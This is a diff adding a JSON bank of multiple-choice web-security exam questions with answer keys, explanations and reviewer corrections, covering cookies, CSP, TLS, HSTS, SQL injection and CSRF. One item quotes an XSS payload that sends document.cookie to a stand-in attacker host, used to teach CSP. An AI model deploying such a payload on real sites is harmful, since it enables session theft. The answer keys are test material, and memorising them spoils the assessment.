@@ -1,0 +1,130 @@
+[
+ {
+  "id": "GEN-T2U2-062",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "An application's session cookie is set with SameSite=Lax. Which request originating from an attacker-controlled page will still arrive at the application carrying that cookie?",
+  "opts": {
+   "A": "An auto-submitting cross-site POST form targeting an application endpoint",
+   "B": "A cross-origin fetch() to the application issued with credentials: 'include'",
+   "C": "A top-level navigation to an application URL caused by the user clicking a link on the attacker's page",
+   "D": "An <img> element on the attacker's page whose src points at an application URL"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "SameSite=Lax withholds the cookie on all cross-site subresource and non-safe-method requests, but deliberately allows it on top-level navigations made with a safe method such as GET, so ordinary inbound links keep working. The auto-submitting POST form is the classic CSRF vector and is exactly what Lax blocks, which is why it is tempting but wrong."
+ },
+ {
+  "id": "GEN-T2U2-063",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A link-preview feature fetches any URL the user submits and returns the response body. An attacker submits a URL pointing at the cloud provider's link-local instance metadata endpoint and retrieves the instance's credentials. In the OWASP Top 10:2025, which category covers this class of flaw?",
+  "opts": {
+   "A": "A01:2025 - Broken Access Control",
+   "B": "A05:2025 - Injection",
+   "C": "A02:2025 - Security Misconfiguration",
+   "D": "A10:2025 - Mishandling of Exceptional Conditions"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "Server-Side Request Forgery had its own category, A10:2021, in the previous edition, but the 2025 edition retired that standalone entry and folded CWE-918 into A01:2025 Broken Access Control, on the reasoning that making a server issue attacker-chosen requests to destinations it should not reach is an access-control failure between services. Injection is the nearest miss - the attacker does supply the input - but the flaw is not that the input gets parsed as code. Note the 2025 renumbering while revising: Injection moved to A05 and Security Misconfiguration to A02, so distractor numbering carried over from the 2021 list is itself a trap.",
+  "reviewFix": "Re-keyed from the 2021 taxonomy to the 2025 one, and the keyed letter changed from D to A. The question pinned itself to '(2021 edition)' and so was internally consistent, but it drilled precisely the fact that has since been reversed: the OWASP Top 10:2025, published 6 November 2025, deleted SSRF as a standalone category and folded CWE-918 into A01:2025 Broken Access Control — verified on owasp.org/Top10/2025/A01_2025-Broken_Access_Control/, which names CWE-918 among its notable CWEs. The option the question taught the student to REJECT ('Broken Access Control') is the one now correct, so drilling it would have trained the wrong answer for a 2026 exam. All four options were rebuilt against the verified 2025 list rather than relabelled, since 2025 also moved Injection to A05 and Security Misconfiguration to A02."
+ },
+ {
+  "id": "GEN-T2U2-064",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "An adversary passively records a site's encrypted TLS traffic today and obtains the server's long-term private key two years later. Which property, if the connections had it, keeps the recorded traffic undecryptable?",
+  "opts": {
+   "A": "Record protection with an AEAD cipher such as AES-GCM",
+   "B": "Forward secrecy from an ephemeral (EC)DHE key exchange, so session keys are never recoverable from the certificate's key",
+   "C": "Certificate pinning in the client",
+   "D": "Strict-Transport-Security sent with a long max-age"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "Forward secrecy comes from deriving each session's keys through an ephemeral Diffie-Hellman exchange whose private values are discarded, so the certificate key only authenticates the handshake and never encrypts the session keys - which is why TLS 1.3 dropped static RSA key transport entirely. AES-GCM protects each record's confidentiality and integrity in transit but says nothing about how the keys were established, so it does not help against a later key compromise."
+ },
+ {
+  "id": "GEN-T2U2-065",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "Users reach a portal by typing the bare domain name, and an on-path attacker strips the HTTP-to-HTTPS redirect on that very first request. Which measure protects a user who has never visited the site before?",
+  "opts": {
+   "A": "Getting the domain added to the browsers' HSTS preload list",
+   "B": "Sending Strict-Transport-Security with a two-year max-age and includeSubDomains on every HTTPS response",
+   "C": "Marking every cookie Secure and HttpOnly",
+   "D": "Publishing a CAA DNS record naming the site's certificate authority"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "An HSTS policy is trust-on-first-use: the browser only learns it after one successful HTTPS response, so the very first plaintext request remains strippable - the preload list closes that gap by shipping the policy inside the browser before any visit. Option B is correct practice and is in fact the prerequisite for preloading, but on its own it cannot protect a first-time visitor."
+ },
+ {
+  "id": "GEN-T2U2-066",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A report screen lets the user pick which column to sort by. The developer tries to bind that column name as a query placeholder, but the driver quotes it as a string literal and the ordering stops working. What is the correct way to make the feature both work and be injection-safe?",
+  "opts": {
+   "A": "Escape the value with the driver's string-escaping function before concatenating it into the ORDER BY clause",
+   "B": "Concatenate the value but reject any input containing a semicolon, a quote or the word UNION",
+   "C": "Compare the value against a fixed server-side allow-list of permitted column names and interpolate only the matching literal from that list",
+   "D": "Wrap the value in single quotes inside the ORDER BY clause so the database treats it as a string"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Placeholders bind values, not identifiers, so a table name, column name or sort direction can never be parameterised; the only safe substitute is to map user input onto a fixed set of identifiers the code already knows and emit one of those. Escaping (option A) is designed for string literals and does not make an identifier position safe, and denylisting keywords (option B) is defeated by inputs the list did not anticipate."
+ },
+ {
+  "id": "GEN-T2U2-067",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A page is served with the header Content-Security-Policy: script-src 'self'. An attacker succeeds in reflecting the markup <img src=x onerror=\"fetch('https://evil.example/'+document.cookie)\"> into that page. What happens when the image fails to load?",
+  "opts": {
+   "A": "The handler runs, because script-src governs <script> elements only and not event handler attributes",
+   "B": "The handler runs, because the injected markup is delivered from the page's own origin, which 'self' permits",
+   "C": "The handler is blocked only if the response additionally sends X-XSS-Protection: 1; mode=block",
+   "D": "The handler is blocked, because an inline event handler attribute counts as inline script and 'self' does not permit inline script"
+  },
+  "ans": "D",
+  "conf": "high",
+  "exp": "CSP treats inline event handler attributes as inline script, so a script-src list that omits 'unsafe-inline' refuses to execute them. A nonce cannot rescue one: a nonce is carried on a <script> element, and an event handler attribute has nowhere to put it — attribute-style inline script is governed by script-src-attr, which only 'unsafe-inline', or 'unsafe-hashes' together with a matching hash, can permit. That is exactly why a nonce-based policy without 'unsafe-inline' blunts reflected XSS: the attacker cannot attach a nonce to injected markup. Option B confuses the origin that served the HTML with the origin of the script source: 'self' only whitelists externally loaded scripts from the same origin, never inline code.",
+  "reviewFix": "Explanation fixed. The key and option text were correct, but the parenthetical '(and supplies no matching nonce or hash)' implied a nonce is a route to permitting an inline event handler attribute. It is not: nonces apply to elements, an onerror= attribute has no place to carry one, and attribute-style inline script is governed by script-src-attr, whose only permitting expressions are 'unsafe-inline' or 'unsafe-hashes' plus a matching hash. As written it would have led a reader to write a nonce policy believing it whitelisted handlers it silently does not. Key unchanged."
+ },
+ {
+  "id": "GEN-T2U2-068",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "An application has an unfixed XSS flaw. Its session cookie is set Secure; HttpOnly; SameSite=Strict. What is the accurate assessment of the attacker's position?",
+  "opts": {
+   "A": "The injected script cannot read the cookie value, but it runs inside the application's own origin and can still drive authenticated state-changing requests to which the browser attaches the cookie",
+   "B": "SameSite=Strict causes the browser to refuse the injected script's requests to the application, because they originate from attacker-supplied markup",
+   "C": "HttpOnly prevents the injected script from executing in the first place",
+   "D": "Secure means the cookie is stored encrypted in the browser's cookie jar, so it cannot be exfiltrated even by script"
+  },
+  "ans": "A",
+  "conf": "high",
+  "exp": "HttpOnly hides the cookie from document.cookie, but the injected script executes with the page's origin and privileges, so it can perform the actions the session authorises without ever seeing the token - which is why cookie flags mitigate but never substitute for fixing XSS. Option B misreads SameSite: it is evaluated against the site of the request's initiating document, and here that document is the application itself, so the requests are same-site."
+ },
+ {
+  "id": "GEN-T2U2-069",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A newly deployed HTTPS site loads without warnings in every desktop browser, but a curl call from a server fails with 'SSL certificate problem: unable to get local issuer certificate'. What is the most likely cause?",
+  "opts": {
+   "A": "The leaf certificate has expired, and browsers ignore expiry for certificates from well-known CAs",
+   "B": "The server presents the leaf certificate but omits the intermediate CA certificate; browsers complete the chain from cached intermediates or by fetching the issuer, while curl's trust store holds only roots",
+   "C": "The certificate's subject alternative names do not include the hostname being requested",
+   "D": "curl does not send SNI, so the server answers with the default virtual host's certificate"
+  },
+  "ans": "B",
+  "conf": "high",
+  "exp": "That specific error means chain building stopped short of a trusted root, and the usual cause is a server bundle missing the intermediate - browsers paper over it because they cache intermediates seen elsewhere and can fetch the issuer named in the certificate, which command-line clients generally do not do. A hostname mismatch (option C) would produce a distinct 'subject name does not match' error and would fail in the browser too."
+ },
+ {
+  "id": "GEN-T2U2-070",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A stateless JSON API cannot keep a per-session CSRF token server-side, so it instead requires every state-changing request to carry a custom header such as X-CSRF-Token. Why does merely requiring that header defeat classic CSRF?",
+  "opts": {
+   "A": "Because an attacker's page has no way to discover which header name the application expects",
+   "B": "Because browsers refuse to attach cookies to any request that carries a custom header",
+   "C": "Because a custom header makes the request non-simple, so the browser must first send a CORS preflight, and without a permissive CORS response the state-changing request is never delivered",
+   "D": "Because HTML forms cannot set request headers, and forms are the only cross-site request vector available to an attacker"
+  },
+  "ans": "C",
+  "conf": "high",
+  "exp": "Only a short safelist of headers may appear on a cross-origin request without a preflight; adding any other header forces an OPTIONS preflight that the application simply declines, so the real request never reaches the endpoint. Option D gets the form half right but is wrong overall - script-driven fetch and XHR are also cross-site vectors, and it is CORS, not the absence of those vectors, that stops them."
+ }
+]
